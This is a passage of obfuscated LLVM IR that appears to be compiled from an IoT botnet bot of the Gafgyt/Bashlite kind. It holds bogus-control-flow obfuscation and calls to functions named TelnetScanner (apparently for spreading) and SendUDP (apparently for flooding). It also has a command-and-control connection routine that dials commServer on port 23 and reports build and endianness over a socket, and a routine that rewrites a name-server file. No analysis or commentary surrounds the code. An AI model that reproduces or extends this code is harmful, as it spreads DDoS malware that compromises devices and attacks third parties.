  br label %1293

; <label>:1293:                                   ; preds = %originalBBpart2196, %originalBBpart2186, %originalBBpart2182
  br label %1294

; <label>:1294:                                   ; preds = %1293
  %1295 = load i32, i32* @x.85
  %1296 = load i32, i32* @y.86
  %1297 = sub i32 %1295, 1
  %1298 = mul i32 %1295, %1297
  %1299 = urem i32 %1298, 2
  %1300 = icmp eq i32 %1299, 0
  %1301 = icmp slt i32 %1296, 10
  %1302 = or i1 %1300, %1301
  br i1 %1302, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1294
  %1303 = load i64, i64* %37, align 8
  %1304 = add i64 %1303, 1
  store i64 %1304, i64* %37, align 8
  %1305 = load i32, i32* @x.85
  %1306 = load i32, i32* @y.86
  %1307 = sub i32 %1305, 1
  %1308 = mul i32 %1305, %1307
  %1309 = urem i32 %1308, 2
  %1310 = icmp eq i32 %1309, 0
  %1311 = icmp slt i32 %1306, 10
  %1312 = or i1 %1310, %1311
  br i1 %1312, label %originalBBpart2206, label %originalBB198alteredBB

originalBBpart2206:                               ; preds = %originalBB198
  br label %1220

; <label>:1313:                                   ; preds = %1220
  %1314 = load i32, i32* %36, align 4
  %1315 = icmp sgt i32 %1314, 0
  br i1 %1315, label %1316, label %1317

; <label>:1316:                                   ; preds = %1313
  br label %1318

; <label>:1317:                                   ; preds = %1313
  br label %1318

; <label>:1318:                                   ; preds = %1317, %1316
  br label %1319

; <label>:1319:                                   ; preds = %1318, %1213
  %1320 = load i8**, i8*** %4, align 8
  %1321 = getelementptr inbounds i8*, i8** %1320, i64 0
  %1322 = load i8*, i8** %1321, align 8
  %1323 = call i32 @strcmp(i8* %1322, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.560, i32 0, i32 0)) #9
  %1324 = icmp ne i32 %1323, 0
  br i1 %1324, label %1326, label %1325

; <label>:1325:                                   ; preds = %1319
  call void @exit(i32 0) #12
  unreachable

; <label>:1326:                                   ; preds = %1319
  %1327 = load i8**, i8*** %4, align 8
  %1328 = getelementptr inbounds i8*, i8** %1327, i64 0
  %1329 = load i8*, i8** %1328, align 8
  %1330 = call i32 @strcmp(i8* %1329, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.561, i32 0, i32 0)) #9
  %1331 = icmp ne i32 %1330, 0
  br i1 %1331, label %1337, label %1332

; <label>:1332:                                   ; preds = %1326
  call void @RemoveTempDirs()
  %1333 = load i32, i32* @mainCommSock, align 4
  %1334 = call i8* @getBuild()
  %1335 = call i32 @getEndianness()
  %1336 = call i32 (i32, i8*, ...) @sockprintf(i32 %1333, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.562, i32 0, i32 0), i8* %1334, i32 %1335)
  br label %1337

; <label>:1337:                                   ; preds = %1332, %1326, %1191, %originalBBpart2158, %1029, %935, %855, %755, %641, %637, %566, %524, %441, %420, %originalBBpart266, %originalBBpart254, %originalBBpart220, %134, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %43
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %72
  %1338 = call i32 @fork() #5
  store i32 %1338, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %1339 = call i64 @sysconf(i32 84) #5
  %1340 = trunc i64 %1339 to i32
  store i32 %1340, i32* %7, align 4
  store i32 999999, i32* %8, align 4
  %1341 = load i32, i32* %7, align 4
  %1342 = icmp eq i32 %1341, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %94
  store i32 500, i32* %8, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %111
  %1343 = load i32, i32* %7, align 4
  %1344 = icmp sge i32 %1343, 2
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %136
  %1345 = load i32, i32* %5, align 4
  %1346 = icmp eq i32 %1345, -1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %155
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %178
  %1347 = call i64 @time(i64* null) #5
  %1348 = call i32 @getpid() #5
  %1349 = sext i32 %1348 to i64
  %_ = sub i64 0, %1347
  %gen = add i64 %_, %1349
  %_23 = shl i64 %1347, %1349
  %1350 = xor i64 %1347, %1349
  %1351 = call i32 @getppid() #5
  %1352 = sext i32 %1351 to i64
  %_24 = sub i64 %1350, %1352
  %gen25 = mul i64 %_24, %1352
  %_26 = sub i64 %1350, %1352
  %gen27 = mul i64 %_26, %1352
  %_28 = sub i64 %1350, %1352
  %gen29 = mul i64 %_28, %1352
  %_30 = shl i64 %1350, %1352
  %_31 = shl i64 %1350, %1352
  %_32 = shl i64 %1350, %1352
  %_33 = shl i64 %1350, %1352
  %1353 = add nsw i64 %1350, %1352
  %1354 = trunc i64 %1353 to i32
  call void @srand(i32 %1354) #5
  %1355 = call i64 @time(i64* null) #5
  %1356 = call i32 @getpid() #5
  %1357 = sext i32 %1356 to i64
  %_34 = shl i64 %1355, %1357
  %_35 = sub i64 %1355, %1357
  %gen36 = mul i64 %_35, %1357
  %_37 = sub i64 0, %1355
  %gen38 = add i64 %_37, %1357
  %_39 = sub i64 %1355, %1357
  %gen40 = mul i64 %_39, %1357
  %1358 = xor i64 %1355, %1357
  %1359 = trunc i64 %1358 to i32
  call void @init_rand(i32 %1359)
  %1360 = load i32, i32* %8, align 4
  call void @TelnetScanner(i32 100, i32 %1360)
  call void @_exit(i32 0) #11
  br label %originalBB22

originalBB44alteredBB:                            ; preds = %originalBB44, %212
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %235
  %1361 = load i32, i32* @scanPid, align 4
  %1362 = icmp eq i32 %1361, 0
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %254
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %274
  %1363 = load i8**, i8*** %4, align 8
  %1364 = getelementptr inbounds i8*, i8** %1363, i64 1
  %1365 = load i8*, i8** %1364, align 8
  %1366 = call i32 @strcmp(i8* %1365, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.551, i32 0, i32 0)) #9
  %1367 = icmp ne i32 %1366, 0
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %296
  %1368 = load i8**, i8*** %4, align 8
  %1369 = getelementptr inbounds i8*, i8** %1368, i64 1
  %1370 = load i8*, i8** %1369, align 8
  %1371 = call i32 @atoi(i8* %1370) #9
  store i32 %1371, i32* %9, align 4
  %1372 = load i8**, i8*** %4, align 8
  %1373 = getelementptr inbounds i8*, i8** %1372, i64 2
  %1374 = load i8*, i8** %1373, align 8
  %1375 = call i32 @atoi(i8* %1374) #9
  store i32 %1375, i32* %10, align 4
  %1376 = call i32 @listFork()
  %1377 = icmp ne i32 %1376, 0
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %328
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %352
  %1378 = load i8**, i8*** %4, align 8
  %1379 = getelementptr inbounds i8*, i8** %1378, i64 1
  %1380 = load i8*, i8** %1379, align 8
  %1381 = call i32 @strcmp(i8* %1380, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.549, i32 0, i32 0)) #9
  %1382 = icmp ne i32 %1381, 0
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %384
  store i32 1000, i32* %14, align 4
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %401
  %1383 = load i32, i32* %11, align 4
  %1384 = icmp ugt i32 %1383, 0
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %422
  %1385 = load i32, i32* %11, align 4
  %1386 = icmp eq i32 %1385, -1
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %442
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %459
  store i32 0, i32* %12, align 4
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %505
  %1387 = load i32, i32* @scanPid, align 4
  %1388 = icmp eq i32 %1387, 0
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %534
  %1389 = load i8**, i8*** %4, align 8
  %1390 = getelementptr inbounds i8*, i8** %1389, i64 1
  %1391 = load i8*, i8** %1390, align 8
  %1392 = call i32 @atoi(i8* %1391) #9
  store i32 %1392, i32* %15, align 4
  %1393 = load i8**, i8*** %4, align 8
  %1394 = getelementptr inbounds i8*, i8** %1393, i64 2
  %1395 = load i8*, i8** %1394, align 8
  %1396 = call i32 @atoi(i8* %1395) #9
  store i32 %1396, i32* %16, align 4
  %1397 = call i32 @listFork()
  %1398 = icmp ne i32 %1397, 0
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %567
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %590
  %1399 = load i32, i32* %3, align 4
  %1400 = icmp slt i32 %1399, 6
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %615
  %1401 = load i8**, i8*** %4, align 8
  %1402 = getelementptr inbounds i8*, i8** %1401, i64 5
  %1403 = load i8*, i8** %1402, align 8
  %1404 = call i32 @atoi(i8* %1403) #9
  %1405 = icmp slt i32 %1404, 1
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %671
  %1406 = load i32, i32* %3, align 4
  %1407 = icmp slt i32 %1406, 6
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %696
  %1408 = load i8**, i8*** %4, align 8
  %1409 = getelementptr inbounds i8*, i8** %1408, i64 2
  %1410 = load i8*, i8** %1409, align 8
  %1411 = call i32 @atoi(i8* %1410) #9
  %1412 = icmp eq i32 %1411, -1
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %733
  %1413 = load i8**, i8*** %4, align 8
  %1414 = getelementptr inbounds i8*, i8** %1413, i64 5
  %1415 = load i8*, i8** %1414, align 8
  %1416 = call i32 @atoi(i8* %1415) #9
  %1417 = icmp slt i32 %1416, 1
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %791
  %1418 = call i32 @listFork()
  %1419 = icmp ne i32 %1418, 0
  br label %originalBB124

originalBB128alteredBB:                           ; preds = %originalBB128, %810
  %1420 = load i8*, i8** %23, align 8
  %1421 = load i32, i32* %18, align 4
  %1422 = load i32, i32* %19, align 4
  %1423 = load i32, i32* %20, align 4
  %1424 = load i32, i32* %21, align 4
  %1425 = load i32, i32* %22, align 4
  call void @SendUDP(i8* %1420, i32 %1421, i32 %1422, i32 %1423, i32 %1424, i32 %1425)
  call void @_exit(i32 0) #11
  br label %originalBB128

originalBB132alteredBB:                           ; preds = %originalBB132, %833
  %1426 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %1426, i8** %23, align 8
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %870
  %1427 = load i32, i32* %3, align 4
  %1428 = icmp slt i32 %1427, 6
  br label %originalBB136

originalBB140alteredBB:                           ; preds = %originalBB140, %913
  %1429 = load i8**, i8*** %4, align 8
  %1430 = getelementptr inbounds i8*, i8** %1429, i64 6
  %1431 = load i8*, i8** %1430, align 8
  %1432 = call i32 @atoi(i8* %1431) #9
  %1433 = icmp slt i32 %1432, 1
  br label %originalBB140

originalBB144alteredBB:                           ; preds = %originalBB144, %959
  store i32 %960, i32* %28, align 4
  %1434 = load i32, i32* %3, align 4
  %1435 = icmp sgt i32 %1434, 5
  br label %originalBB144

originalBB148alteredBB:                           ; preds = %originalBB148, %985
  store i32 %986, i32* %29, align 4
  store i32 32, i32* %30, align 4
  %1436 = load i8*, i8** %24, align 8
  %1437 = call i8* @strstr(i8* %1436, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #9
  %1438 = icmp ne i8* %1437, null
  br label %originalBB148

originalBB152alteredBB:                           ; preds = %originalBB152, %1048
  %1439 = load i8**, i8*** %4, align 8
  %1440 = getelementptr inbounds i8*, i8** %1439, i64 2
  %1441 = load i8*, i8** %1440, align 8
  %1442 = call i32 @atoi(i8* %1441) #9
  %1443 = icmp slt i32 %1442, 1
  br label %originalBB152

originalBB156alteredBB:                           ; preds = %originalBB156, %1076
  br label %originalBB156

originalBB160alteredBB:                           ; preds = %originalBB160, %1093
  %1444 = load i8**, i8*** %4, align 8
  %1445 = getelementptr inbounds i8*, i8** %1444, i64 1
  %1446 = load i8*, i8** %1445, align 8
  store i8* %1446, i8** %32, align 8
  %1447 = load i8**, i8*** %4, align 8
  %1448 = getelementptr inbounds i8*, i8** %1447, i64 2
  %1449 = load i8*, i8** %1448, align 8
  %1450 = call i32 @atoi(i8* %1449) #9
  store i32 %1450, i32* %33, align 4
  %1451 = load i8**, i8*** %4, align 8
  %1452 = getelementptr inbounds i8*, i8** %1451, i64 3
  %1453 = load i8*, i8** %1452, align 8
  %1454 = call i32 @atoi(i8* %1453) #9
  store i32 %1454, i32* %34, align 4
  %1455 = load i8*, i8** %32, align 8
  %1456 = call i8* @strstr(i8* %1455, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #9
  %1457 = icmp ne i8* %1456, null
  br label %originalBB160

originalBB164alteredBB:                           ; preds = %originalBB164, %1124
  %1458 = load i8*, i8** %32, align 8
  %1459 = call i8* @strtok(i8* %1458, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %1459, i8** %35, align 8
  br label %originalBB164

originalBB168alteredBB:                           ; preds = %originalBB168, %1143
  %1460 = load i8*, i8** %35, align 8
  %1461 = icmp ne i8* %1460, null
  br label %originalBB168

originalBB172alteredBB:                           ; preds = %originalBB172, %1162
  %1462 = call i32 @listFork()
  %1463 = icmp ne i32 %1462, 0
  br label %originalBB172

originalBB176alteredBB:                           ; preds = %originalBB176, %1196
  br label %originalBB176

originalBB180alteredBB:                           ; preds = %originalBB180, %1224
  %1464 = load i32*, i32** @pids, align 8
  %1465 = load i64, i64* %37, align 8
  %1466 = getelementptr inbounds i32, i32* %1464, i64 %1465
  %1467 = load i32, i32* %1466, align 4
  %1468 = icmp ne i32 %1467, 0
  br label %originalBB180

originalBB184alteredBB:                           ; preds = %originalBB184, %1246
  %1469 = load i32*, i32** @pids, align 8
  %1470 = load i64, i64* %37, align 8
  %1471 = getelementptr inbounds i32, i32* %1469, i64 %1470
  %1472 = load i32, i32* %1471, align 4
  %1473 = call i32 @getpid() #5
  %1474 = icmp ne i32 %1472, %1473
  br label %originalBB184

originalBB188alteredBB:                           ; preds = %originalBB188, %1269
  %1475 = load i32*, i32** @pids, align 8
  %1476 = load i64, i64* %37, align 8
  %1477 = getelementptr inbounds i32, i32* %1475, i64 %1476
  %1478 = load i32, i32* %1477, align 4
  %1479 = call i32 @kill(i32 %1478, i32 9) #5
  %1480 = load i32, i32* %36, align 4
  %_189 = sub i32 %1480, 1
  %gen190 = mul i32 %_189, 1
  %_191 = sub i32 0, %1480
  %gen192 = add i32 %_191, 1
  %_193 = sub i32 %1480, 1
  %gen194 = mul i32 %_193, 1
  %1481 = add nsw i32 %1480, 1
  store i32 %1481, i32* %36, align 4
  br label %originalBB188

originalBB198alteredBB:                           ; preds = %originalBB198, %1294
  %1482 = load i64, i64* %37, align 8
  %_199 = sub i64 0, %1482
  %gen200 = add i64 %_199, 1
  %_201 = sub i64 0, %1482
  %gen202 = add i64 %_201, 1
  %_203 = sub i64 0, %1482
  %gen204 = add i64 %_203, 1
  %1483 = add i64 %1482, 1
  store i64 %1483, i64* %37, align 8
  br label %originalBB198
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) #3

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @getppid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %33 [
    i32 66051, label %13
    i32 50462976, label %14
    i32 33751041, label %15
    i32 16777986, label %32
  ]

; <label>:13:                                     ; preds = %0
  store i32 ptrtoint ([11 x i8]* @.str.565 to i32), i32* %1, align 4
  br label %34

; <label>:14:                                     ; preds = %0
  store i32 ptrtoint ([14 x i8]* @.str.566 to i32), i32* %1, align 4
  br label %34

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* @x.87
  %17 = load i32, i32* @y.88
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 ptrtoint ([13 x i8]* @.str.567 to i32), i32* %1, align 4
  %24 = load i32, i32* @x.87
  %25 = load i32, i32* @y.88
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:32:                                     ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.568 to i32), i32* %1, align 4
  br label %34

; <label>:33:                                     ; preds = %0
  store i32 ptrtoint ([8 x i8]* @.str.569 to i32), i32* %1, align 4
  br label %34

; <label>:34:                                     ; preds = %33, %32, %originalBBpart2, %14, %13
  %35 = load i32, i32* %1, align 4
  ret i32 %35

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 ptrtoint ([13 x i8]* @.str.567 to i32), i32* %1, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = load i32, i32* @x.89
  %21 = load i32, i32* @y.90
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %29 = load i32, i32* @currentServer, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %30
  %32 = load i8*, i8** %31, align 8
  %33 = call i8* @strcpy(i8* %28, i8* %32) #5
  store i32 23, i32* %3, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #9
  %36 = icmp ne i8* %35, null
  %37 = load i32, i32* @x.89
  %38 = load i32, i32* @y.90
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %52

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %47 = call i8* @strchr(i8* %46, i32 58) #9
  %48 = getelementptr inbounds i8, i8* %47, i64 1
  %49 = call i32 @atoi(i8* %48) #9
  store i32 %49, i32* %3, align 4
  %50 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %51 = call i8* @strchr(i8* %50, i32 58) #9
  store i8 0, i8* %51, align 1
  br label %52

; <label>:52:                                     ; preds = %45, %originalBBpart2
  %53 = load i32, i32* @x.89
  %54 = load i32, i32* @y.90
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %61, i32* @mainCommSock, align 4
  %62 = load i32, i32* @mainCommSock, align 4
  %63 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %64 = load i32, i32* %3, align 4
  %65 = call i32 @connectTimeout(i32 %62, i8* %63, i32 %64, i32 30)
  %66 = icmp ne i32 %65, 0
  %67 = load i32, i32* @x.89
  %68 = load i32, i32* @y.90
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %66, label %92, label %75

; <label>:75:                                     ; preds = %originalBBpart24
  %76 = load i32, i32* @x.89
  %77 = load i32, i32* @y.90
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %75
  store i32 1, i32* %1, align 4
  %84 = load i32, i32* @x.89
  %85 = load i32, i32* @y.90
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %109

; <label>:92:                                     ; preds = %originalBBpart24
  %93 = load i32, i32* @x.89
  %94 = load i32, i32* @y.90
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %92
  store i32 0, i32* %1, align 4
  %101 = load i32, i32* @x.89
  %102 = load i32, i32* @y.90
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %109

; <label>:109:                                    ; preds = %originalBBpart212, %originalBBpart28
  %110 = load i32, i32* %1, align 4
  ret i32 %110

originalBBalteredBB:                              ; preds = %originalBB, %19
  %111 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %112 = load i32, i32* @currentServer, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %113
  %115 = load i8*, i8** %114, align 8
  %116 = call i8* @strcpy(i8* %111, i8* %115) #5
  store i32 23, i32* %3, align 4
  %117 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %118 = call i8* @strchr(i8* %117, i32 58) #9
  %119 = icmp ne i8* %118, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %120 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %120, i32* @mainCommSock, align 4
  %121 = load i32, i32* @mainCommSock, align 4
  %122 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %123 = load i32, i32* %3, align 4
  %124 = call i32 @connectTimeout(i32 %121, i8* %122, i32 %123, i32 30)
  %125 = icmp ne i32 %124, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %75
  store i32 1, i32* %1, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %92
  store i32 0, i32* %1, align 4
  br label %originalBB10
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = load i32, i32* @x.91
  %2 = load i32, i32* @y.92
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.563, i32 0, i32 0), i32 513)
  %13 = trunc i32 %12 to i16
  store i16 %13, i16* %9, align 2
  %14 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.563, i32 0, i32 0), i32 0) #5
  %15 = icmp ne i32 %14, -1
  %16 = load i32, i32* @x.91
  %17 = load i32, i32* @y.92
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %48

; <label>:24:                                     ; preds = %originalBBpart2
  %25 = load i32, i32* @x.91
  %26 = load i32, i32* @y.92
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %24
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.564, i32 0, i32 0), i8** %10, align 8
  %33 = load i8*, i8** %10, align 8
  %34 = call i64 @strlen(i8* %33) #9
  store i64 %34, i64* %11, align 8
  %35 = load i16, i16* %9, align 2
  %36 = zext i16 %35 to i32
  %37 = load i8*, i8** %10, align 8
  %38 = load i64, i64* %11, align 8
  %39 = call i64 @write(i32 %36, i8* %37, i64 %38)
  %40 = load i32, i32* @x.91
  %41 = load i32, i32* @y.92
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %49

; <label>:48:                                     ; preds = %originalBBpart2
  br label %69

; <label>:49:                                     ; preds = %originalBBpart24
  %50 = load i32, i32* @x.91
  %51 = load i32, i32* @y.92
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %49
  %58 = load i16, i16* %9, align 2
  %59 = zext i16 %58 to i32
  %60 = call i32 @close(i32 %59)
  %61 = load i32, i32* @x.91
  %62 = load i32, i32* @y.92
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
